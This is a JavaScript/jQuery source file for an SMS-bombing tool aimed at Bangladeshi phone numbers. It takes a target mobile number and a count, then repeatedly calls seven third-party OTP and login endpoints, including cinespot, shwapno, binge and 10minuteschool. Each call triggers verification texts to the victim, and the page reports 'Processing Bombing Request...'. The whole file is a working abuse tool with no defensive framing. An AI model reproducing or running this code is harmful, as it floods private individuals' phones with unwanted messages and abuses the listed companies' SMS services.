// Author: AXAK ;)

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {        
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
                {
                    method: "POST",
                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
                },
                {
                    method: 'POST',
                    url: "http://robi.api.bongobd.com/api/login/send-otp",
                    body: `msisdn=88${mobile}&operator=all`
                },
                {
                    method: 'GET',
                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
                },
                {
                    method: 'GET',
                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                },
                {
                    url: "https://ss.binge.buzz/otp/send/login",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    method:"GET",
                    url:`https://stage.bioscopelive.com/en/login/send-otp?phone=88${mobile}&operator=bd-otp`
                },
                {
                    method:"POST",
                    url:"https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists",
                    body:`{"contact": "+88${mobile}","type": "phone"}`

                }

            ];

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Processing Bombing Request...");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})